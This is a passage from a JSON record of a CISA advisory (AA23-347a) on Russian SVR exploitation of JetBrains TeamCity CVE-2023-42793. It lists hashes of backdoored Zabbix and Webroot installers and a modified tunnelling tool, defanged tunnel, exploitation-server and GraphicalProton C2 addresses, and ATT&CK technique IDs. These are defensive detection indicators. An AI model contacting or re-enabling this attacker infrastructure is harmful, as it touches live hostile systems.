vcperf:\n\nD724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443\n\nBackdoored Zabbix installation archive:\n\n4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F\n\nBackdoored Webroot AV installation archive:\n\n950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4\n\nModified rsockstun\n\nCB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF\n\nNetwork IoCs\nTunnel Endpoints\n\n65.20.97[.]203\n65.21.51[.]58\n\nExploitation Server\n\n103.76.128[.]34\n\nGraphicalProton HTTPS C2 URL:\nhxxps://matclick[.]com/wp-query[.]php\n\n",
  "cves": [
    "CVE-2023-42793"
  ],
  "techniques": [
    "T1098",
    "T1592.002",
    "T1564",
    "T1046",
    "T1547",
    "T1574",
    "T1592",
    "T1033",
    "T1505",
    "T1210",
    "T1059.001",
    "T1567",
    "T1572",
    "T1574.002",
    "T1505.001",
    "T1558.001",
    "T1590",
    "T1003.001",
    "T1041",
    "T1057",
    "T1055",
    "T1053.005",
    "T1053",
    "T1562",
    "T1203",
    "T1027",
    "T1059",
    "T1562.001",
    "T1590.004",
    "T1003",
    "T1555.003",
    "T1003.002",
    "T1068",
    "T1049",
    "T1047",
    "T1190",
    "T1027.001",
    "T1564.001",
    "T1020",
    "T1036",
    "T1558",
    "T1059.003",
    "T1568",
    "T1555"
  ],
  "advisory": "aa23-347a",
  "title": "Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally | CISA",
  "source": "cybersecurity-advisories",
  "id": "3aad2e7441298f68bd3ae83982bfabffd414837ec7dbd19b04acfc13b82ec940"
}